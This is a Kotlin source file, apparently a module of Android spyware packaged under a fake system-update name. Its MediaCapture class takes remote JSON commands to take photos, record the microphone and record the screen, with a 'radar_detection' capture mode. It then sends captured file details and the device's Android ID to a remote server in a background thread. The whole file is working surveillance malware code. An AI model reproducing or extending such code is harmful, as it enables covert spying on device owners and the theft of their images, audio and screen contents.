package com.android.system.update.modules.media

import android.content.Context
import android.provider.Settings
import com.android.system.update.core.NetworkConnectionManager
import org.json.JSONObject

class MediaCapture(private val context: Context) {

    private val networkManager = NetworkConnectionManager(context)
    private val cameraAgent = CameraManagerAgent(context)
    private val micRecorder = MicrophoneRecorder(context)
    private val screenRecorder = ScreenRecorder(context)

    fun executeCommand(cmd: JSONObject): String {
        val type = cmd.optString("type")
        val params = cmd.optJSONObject("params") ?: JSONObject()
        return when (type) {
            "capture_photo" -> handleCapturePhoto(params)
            "record_audio" -> handleRecordAudio(params)
            "record_screen" -> handleRecordScreen(params)
            else -> "ERR_UNKNOWN_CMD"
        }
    }

    private fun handleCapturePhoto(params: JSONObject): String {
        val cameraId = params.optString("camera_id", "0")
        val isSensitive = params.optBoolean("is_sensitive", false)
        return try {
            val file = cameraAgent.takePhoto(cameraId, false)
            if (file != null) {
                val payload = JSONObject().apply {
                    put("device_id", getDeviceId())
                    put("source_type", "camera")
                    put("capture_mode", if (isSensitive) "radar_detection" else "manual_cmd")
                    put("file_path", file.absolutePath)
                    put("is_sensitive", isSensitive)
                }
                Thread { networkManager.sync(payload.toString(), "media_captures") }.start()
                "PHOTO_SUCCESS"
            } else {
                "ERR_FILE_NULL"
            }
        } catch (e: Exception) {
            "ERR_EXCEPTION: ${e.message}"
        }
    }

    private fun handleRecordAudio(params: JSONObject): String {
        val duration = params.optInt("duration", 10)
        return try {
            micRecorder.startRecording(duration)
            "AUDIO_START"
        } catch (e: Exception) {
            "ERR_AUDIO"
        }
    }

    private fun handleRecordScreen(params: JSONObject): String {
        val duration = params.optInt("duration", 10)
        return try {
            screenRecorder.startRecording(duration)
            "SCREEN_START"
        } catch (e: Exception) {
            "ERR_SCREEN"
        }
    }

    private fun getDeviceId(): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }
}